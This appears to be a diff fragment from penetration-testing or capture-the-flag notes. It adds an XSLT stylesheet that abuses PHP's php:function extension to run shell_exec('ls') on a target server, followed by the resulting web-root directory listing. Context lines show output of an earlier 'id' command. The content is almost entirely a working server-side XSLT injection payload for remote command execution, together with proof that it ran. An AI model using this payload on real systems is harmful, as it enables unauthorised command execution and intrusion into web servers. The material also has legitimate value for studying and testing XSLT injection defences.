@@ -27,3 +27,27 @@
 **<?xml version="1.0"?>
 **uid=10095(a0563af8) gid=1050(a0563af8) groups=1050(a0563af8)
 
+
+```xml
+   <?xml version="1.0" encoding="utf-8"?>
+   <xsl:stylesheet version="1.0"
+   xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+   xmlns:php="http://php.net/xsl">
+     <xsl:template match="/">
+       <xsl:value-of select="php:function('shell_exec','ls')" />
+     </xsl:template>
+   </xsl:stylesheet>```
+
+**<?xml version="1.0"?>
+cron.php
+errors
+get.php
+health_check.php
+index.php
+media
+opt
+robots.txt
+static
+static.php
+
+
